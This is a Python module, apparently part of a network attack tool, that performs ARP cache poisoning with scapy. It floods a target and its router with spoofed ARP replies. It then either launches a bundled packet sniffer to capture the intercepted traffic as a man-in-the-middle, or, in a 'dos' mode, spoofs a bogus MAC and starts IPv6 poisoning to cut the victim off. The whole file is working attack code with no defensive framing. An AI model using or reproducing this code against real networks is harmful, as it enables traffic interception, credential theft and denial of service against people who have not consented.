import socket
import threading
import time
import platform
import signal
import subprocess
from pathlib import Path

from scapy.all import ARP, Ether, sendp, sniff

from utils import config
from utils.utilities import get_ip
from utils import utilities
from modules import ipv6_poison

stop_event = threading.Event()
MODULE_DIR = Path(__file__).resolve().parent
BINARY_DIR = MODULE_DIR / "binaries"
PROJECT_ROOT = MODULE_DIR.parents[1]
CAPTURE_DIR = PROJECT_ROOT / "captures"

CAPTURE_DIR.mkdir(parents=True, exist_ok=True)


def arp_poison_loop(target_ip, router_ip, dst_mac, spoof_mac):
    # Dedicated loop for ARP poisoning.
    packet = Ether(dst=dst_mac) / ARP(
        op=2,
        pdst=target_ip,
        psrc=router_ip,
        hwsrc=spoof_mac
    )

    while not stop_event.is_set():
        utilities.safe_send(packet)
        time.sleep(0.1)


def restore_arp_tables(
    target_ip,
    router_ip,
    router_mac,
    target_mac
):
    heal_router = Ether(dst=router_mac) / ARP(
        op=2,
        pdst=router_ip,
        psrc=target_ip,
        hwsrc=target_mac,
        hwdst=router_mac,
    )

    heal_target = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        psrc=router_ip,
        hwsrc=router_mac,
        hwdst=target_mac,
    )

    for x in range(config.HEAL_PACKETS):
        utilities.safe_send(heal_router)
        utilities.safe_send(heal_target)
        time.sleep(config.HEAL_JITTER)


def start_sniffer_binary():
    current_os = platform.system()

    if current_os == "Windows":
        binary = BINARY_DIR / "sniffer.exe"
    elif current_os == "Linux":
        binary = BINARY_DIR / "sniffer"
    else:
        utilities.print_warning(
            "The bundled packet sniffer currently supports "
            "Windows and Linux only."
        )
        return

    if not binary.exists():
        utilities.print_error(
            f"Packet sniffer binary not found: {binary}"
        )
        return

    try:
        sniffer_binary = subprocess.Popen(
            [
                str(binary),
                config.BPF,
                config.INTERFACE,
            ],
            start_new_session=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            cwd=CAPTURE_DIR,
        )

    except OSError as exc:
        utilities.print_error(
            f"Unable to start packet sniffer: {exc}"
        )
        return

    utilities.print_info(
        "Packet sniffer opened successfully, "
        "the capture has begun! ^-^\n"
        "Press ctrl+c at any time to exit."
    )

    while not stop_event.is_set():
        if sniffer_binary.poll() is not None:
            break

        time.sleep(0.2)

    if sniffer_binary.poll() is None:
        try:
            sniffer_binary.send_signal(signal.SIGINT)
        except ProcessLookupError:
            pass

    out, _ = sniffer_binary.communicate()

    if out:
        print(out)

    if sniffer_binary.returncode not in (
        0,
        -signal.SIGINT,
    ):
        utilities.print_error(
            f"Packet sniffer exited with code "
            f"{sniffer_binary.returncode}."
        )


def start_arp_poison(
    target_ip,
    target_mac,
    router_ip,
    attacker_mac,
    router_mac,
    dos
):
    stop_event.clear()
    threads = []

    # Target poisoning
    address = (
        "00:00:00:00:00:03"
        if dos
        else attacker_mac
    )

    target_thread = threading.Thread(
        target=arp_poison_loop,
        args=(
            target_ip,
            router_ip,
            target_mac,
            address
        ),
        daemon=True,
    )

    threads.append(target_thread)

    # Router Poisoning
    router_thread = threading.Thread(
        target=arp_poison_loop,
        args=(
            router_ip,
            target_ip,
            router_mac,
            attacker_mac
        ),
        daemon=True,
    )

    threads.append(router_thread)

    if dos:
        utilities.print_info(
            "Starting IPv6 poisoning..."
        )

        ipv6_thread = threading.Thread(
            target=ipv6_poison.poison_service,
            args=(
                target_mac,
                stop_event
            ),
            daemon=True,
        )

        threads.append(ipv6_thread)

    else:
        sniff_thread = threading.Thread(
            target=start_sniffer_binary,
            daemon=True,
        )

        threads.append(sniff_thread)

    for thread in threads:
        thread.start()

    return threads